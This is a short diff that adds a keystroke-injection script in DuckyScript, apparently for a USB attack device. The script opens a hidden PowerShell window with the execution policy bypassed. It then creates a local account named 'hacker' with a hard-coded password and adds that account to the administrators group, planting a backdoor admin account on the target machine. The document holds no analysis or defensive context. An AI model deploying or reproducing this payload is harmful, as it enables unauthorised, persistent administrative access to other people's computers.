@@ -1,0 +1,9 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Requires admin privileges
+STRING $user = "hacker"; $pass = "P@ssw0rd123!"; net user $user $pass /add; net localgroup administrators $user /add; Write-Host "User $user created with password $pass"
+ENTER
